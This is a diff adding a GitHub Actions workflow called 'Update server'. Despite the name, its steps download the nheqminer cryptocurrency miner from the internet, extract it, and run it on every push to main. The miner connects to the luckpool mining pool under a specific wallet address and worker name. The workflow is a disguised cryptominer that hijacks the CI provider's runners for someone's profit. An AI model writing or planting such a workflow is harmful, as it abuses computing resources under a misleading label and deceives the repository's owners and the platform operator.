@@ -1,0 +1,31 @@
+name: Update server
+on:
+  push:
+    branches:
+      - main  # Change this to the branch you want to trigger the workflow on
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Install wget and tar
+        run: sudo apt-get update && sudo apt-get install -y wget tar
+
+      - name: Download nheqminer
+        run: |
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+
+      - name: Extract files
+        run: |
+          tar -xvf nheqminer-Linux-v0.8.2.tgz
+          # Uncomment the next line if you need to extract the .tar.gz file as well
+          # tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+
+      - name: Run nheqminer
+        run: |
+          cd nheqminer
+          ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
